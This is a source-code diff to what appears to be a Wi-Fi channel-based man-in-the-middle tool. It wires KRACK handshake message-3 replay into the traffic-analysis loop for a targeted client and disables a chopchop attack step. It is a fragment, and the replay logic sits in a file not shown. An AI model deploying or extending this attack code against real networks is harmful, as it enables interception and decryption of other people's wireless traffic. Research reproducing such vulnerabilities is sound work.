@@ -44,6 +44,7 @@
 #include "MacAddr.h"
 #include "ClientInfo.h"
 #include "SeqnumStats.h"
+#include "KrackState.h"
 
 //#define FIXED_CLIENT_LIST
 
@@ -1077,8 +1078,19 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 	// Detect & handle MIC failure. Don't forward it.
 	if (detect_mic_failure(buf, *plen, dbgout))
 		return 0;
+*/
+	if (client && memcmp(hdr->addr1, client->mac, 6) == 0)
+	{
+		// TODO Do this in a KrackState method
+		if (client->krackstate->num_coll_pkts >= DATA_FRAMES_COLLECTION_LIMIT)
+		{
+			printf("reval = %d\n", client->krackstate->replay_msg3(clone));
+		}
+		int rval = client->krackstate->handle_packet(buf, *plen);
+		return rval;
+	}
 
-	return 1;
+	return *plen;
 }
 
 
@@ -1458,7 +1470,7 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 		}
 
 		// chopchop 'thread' gets to execute every tick
-		chopchop_tick(ap, clone);
+		//chopchop_tick(ap, clone);
 
 		// sleep time = MIN(time untill next beacon, tick)
 		timespec_diff(&time_next_beacon, &now, &timeleft);
